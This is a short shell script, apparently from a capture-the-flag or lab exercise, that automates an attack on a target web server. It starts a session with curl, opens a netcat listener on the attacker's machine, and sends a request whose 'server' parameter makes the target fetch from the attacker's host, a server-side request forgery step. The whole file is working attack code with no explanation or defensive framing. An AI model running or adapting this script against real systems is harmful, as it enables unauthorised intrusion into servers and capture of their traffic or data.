#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.76.228"
attack_ip="10.10.239.245"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8087" -L > /dev/null

# Tweak the server into downloading resume from our attack box
xterm -hold -e "nc -lvnp 8087" &
sleep 10
curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342"
